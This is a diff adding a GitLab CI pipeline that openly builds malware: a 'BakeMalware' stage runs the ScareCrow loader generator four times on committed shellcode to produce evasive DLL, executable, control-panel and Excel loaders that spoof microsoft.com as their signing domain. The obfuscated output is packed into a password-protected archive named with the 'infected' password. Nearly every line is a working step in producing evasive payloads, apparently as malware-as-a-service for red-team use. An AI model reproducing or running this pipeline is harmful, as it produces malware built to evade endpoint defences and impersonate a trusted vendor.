@@ -1,0 +1,72 @@
+stages:
+    - PreProcess
+    - BakeMalware
+    - PostProcess
+
+workflow:
+    rules:
+        - changes:
+            - shellcode/*
+
+PreProcess:
+    stage: PreProcess
+    tags:
+        - maas
+    script:
+        - |
+            mkdir -p /payloads/${CI_COMMIT_SHORT_SHA}/.lib
+            ln -s /usr/local/bin/garble /payloads/${CI_COMMIT_SHORT_SHA}/.lib/garble
+
+ScareCrow01:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader dll -domain microsoft.com
+
+ScareCrow02:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader binary -domain microsoft.com
+
+ScareCrow03:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader control -domain microsoft.com
+
+ScareCrow04:
+    stage: BakeMalware
+    tags:
+        - maas
+    script:
+        - |
+            cd /payloads/${CI_COMMIT_SHORT_SHA}
+            ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader excel -domain microsoft.com
+
+PostProcess:
+    stage: PostProcess
+    tags:
+        - maas
+    script:
+        - |
+            DEST=${CI_PROJECT_DIR}/ScareCrowPayloads
+            rm -rf /payloads/${CI_COMMIT_SHORT_SHA}/.lib
+            cd /payloads
+            7z a "${DEST}/${CI_COMMIT_SHORT_SHA}.7z" "${CI_COMMIT_SHORT_SHA}/*" -p"infected"
+            rm -rf /payloads/${CI_COMMIT_SHORT_SHA}
+    artifacts:
+        name: ScareCrowPayloads
+        paths:
+            - ScareCrowPayloads/
+        expire_in: 1 day
+
